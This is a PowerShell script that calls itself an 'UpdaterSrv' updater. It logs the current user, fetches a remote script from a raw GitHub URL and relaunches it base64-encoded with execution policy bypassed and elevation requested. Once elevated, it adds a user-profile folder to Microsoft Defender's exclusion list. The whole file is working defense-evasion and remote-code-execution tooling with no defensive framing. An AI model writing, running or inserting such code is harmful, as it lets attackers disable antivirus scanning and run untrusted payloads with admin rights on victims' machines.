# Define a log file path accessible by most users (including LocalSystem)
$logPath = "C:\Windows\Temp\updater_log.txt"

function Write-Log($msg) {
    try {
        $msg = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $msg"
        $msg | Out-File -FilePath $logPath -Append -Encoding utf8
    } catch {}
}

# Log user info
try {
    $currentUser = whoami
    Write-Log "UpdaterSrv script executed by user $currentUser"
} catch {
    Write-Log "Failed to identify user: $_"
}

# List of folders to ensure in Defender exclusions
$foldersToEnsure = @(
    "$env:USERPROFILE\TestSafeFolder"
)

# Check for admin rights
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$admin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $admin) {
    Write-Log "Not running as admin. Relaunching with elevation..."
    try {
        $scriptUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1"
        $remoteScript = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing | Select-Object -ExpandProperty Content
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($remoteScript)
        $encodedCommand = [Convert]::ToBase64String($bytes)
        Start-Process powershell.exe "-ExecutionPolicy Bypass -EncodedCommand $encodedCommand" -Verb RunAs
    } catch {
        Write-Log "Failed to relaunch as admin: $_"
    }
    exit
}

Write-Log "Running as admin. Checking Defender exclusions..."

try {
    $existingExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
} catch {
    Write-Log "Failed to get Defender exclusions: $_"
    exit
}

$missing = $foldersToEnsure | Where-Object { $_ -notin $existingExclusions }

foreach ($folder in $missing) {
    try {
        New-Item -ItemType Directory -Force -Path $folder | Out-Null
        Add-MpPreference -ExclusionPath $folder
        Write-Log "Added exclusion: $folder"
    } catch {
        Write-Log "Failed to add exclusion for `${folder}`: $_"
    }
}
